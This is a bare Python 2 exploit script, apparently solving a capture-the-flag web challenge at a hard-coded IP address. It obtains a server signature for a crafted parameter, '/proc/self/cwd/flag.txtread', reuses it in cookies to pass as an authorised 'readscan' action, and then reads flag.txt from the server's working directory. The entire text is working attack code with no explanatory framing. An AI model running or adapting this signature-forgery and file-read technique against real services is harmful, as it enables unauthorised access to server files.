import requests
'''
#generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)
'''
def geneSign(param):
    return requests.get('http://139.180.128.86/geneSign?param={}'.format(param)).text

sign = geneSign('/proc/self/cwd/flag.txtread')
action = 'readscan'
param = '/proc/self/cwd/flag.txt'
cookies = {'action': action, 'sign': sign}

print requests.get('http://139.180.128.86/De1ta?param={}'.format(param), cookies=cookies).text
